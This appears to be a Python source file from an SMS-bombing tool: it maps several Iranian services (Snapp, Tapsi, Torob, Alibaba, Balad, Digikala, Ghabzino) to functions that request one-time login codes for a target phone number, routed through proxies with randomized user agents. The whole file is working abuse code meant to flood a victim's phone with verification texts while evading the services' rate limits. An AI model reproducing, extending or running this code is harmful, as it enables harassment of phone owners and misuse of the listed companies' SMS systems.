from requests import post, get
from user_agent import generate_user_agent

SERVICES = {
    'snapp': lambda num, proxies: post(
        proxies=proxies,
        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        json={"cellphone": "+98"+num},
        headers={
            "Host": "app.snapp.taxi",
            "content-length": "29",
            "x-app-name": "passenger-pwa",
            "x-app-version": "5.0.0",
            "app-version": "pwa",
            "user-agent": generate_user_agent(os="linux"),
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://app.snapp.taxi",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.snapp.taxi/login/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
            "cookie": "_gat=1"
        }
    ),
    
    'tapsi': lambda num, proxies: post(
        proxies=proxies,
        url="https://tap33.me/api/v2/user",
        json={"credential":{"phoneNumber":f'0{num}',"role":"PASSENGER"}}
    ),
    
    'torob': lambda num, proxies: get(
        proxies=proxies,
        url=f'https://api.torob.com/a/phone/send-pin/?phone_number=0{num}',
        headers={
            "Host": "api.torob.com",
            "user-agent": generate_user_agent(os="linux"),
            "accept": "*/*",
            "origin": "https://torob.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://torob.com/user/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
            "cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com=eyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"
        }
    ),
    
    'alibaba': lambda num, proxies: post(
        proxies=proxies,
        url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
        json={"phoneNumber":f'0{num}'}
    ),
    
    'snapmarket': lambda num, proxies: post(
        proxies=proxies,
        url="https://account.api.balad.ir/api/web/auth/login/",
        json={
            "phone_number": f'0{num}',
            "os_type": "W"
        }
    ),
    
    
    'digikala': lambda num, proxies: post(
        proxies=proxies,
        url='https://api.digikala.com/v1/user/authenticate/',
        json={"username": f'0{num}'},
        headers={"User-Agent": generate_user_agent(os="mac")}
    ),
    
    'ghabzino': lambda num, proxies: post(
        proxies=proxies,
        url='https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode',
        json={"Parameters": {"MobileNumber": f'0{num}'}},
        headers={'content-type': 'application/json', 'User-Agent': generate_user_agent(os="linux")}
    )
}
